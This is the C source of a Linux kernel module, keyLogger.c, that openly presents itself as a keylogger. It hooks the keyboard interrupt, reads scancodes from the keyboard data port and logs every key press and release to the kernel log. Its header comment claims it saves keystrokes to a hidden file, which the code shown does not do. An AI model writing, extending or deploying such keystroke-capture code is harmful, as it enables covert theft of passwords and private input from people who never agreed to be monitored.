/*
 *
 * keyLogger.c
 *
 * Simple keylogger which will saved any key pressed by user to an hidden file.
 * The keylogger is a module running in linux space, he doesn't care how he
 * got there.
 *
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#define KBD_IRQ 1 /* IRQ number for keyboard (i8042) */
#define KBD_DATA_REG 0x60 /* I/O port for keyboard data */
#define KBD_SCANCODE_MASK 0x7f
#define KBD_STATUS_MASK 0x80

static irqreturn_t kbd2_isr(int irq, void *dev_id){
	char scancode;

	scancode = inb(KBD_DATA_REG);
	pr_info("Scan Code %x %s\n",scancode & KBD_SCANCODE_MASK,scancode & KBD_STATUS_MASK ? "Released" : "Pressed");

	return IRQ_HANDLED;
}

static int __init keyLogger_birth(void){
	pr_info("A new keyLogger was born\n");

	// First lets try to catch kystroke from user
	// and print it to the log.
	return request_irq(KBD_IRQ, kbd2_isr, IRQF_SHARED,"kbd2", (void *)kbd2_isr);
}

static void __exit keyLogger_death(void){
	pr_info("The keyLogger is dead\n");
	free_irq(KBD_IRQ, (void *)kbd2_isr);
}

module_init(keyLogger_birth);
module_exit(keyLogger_death);

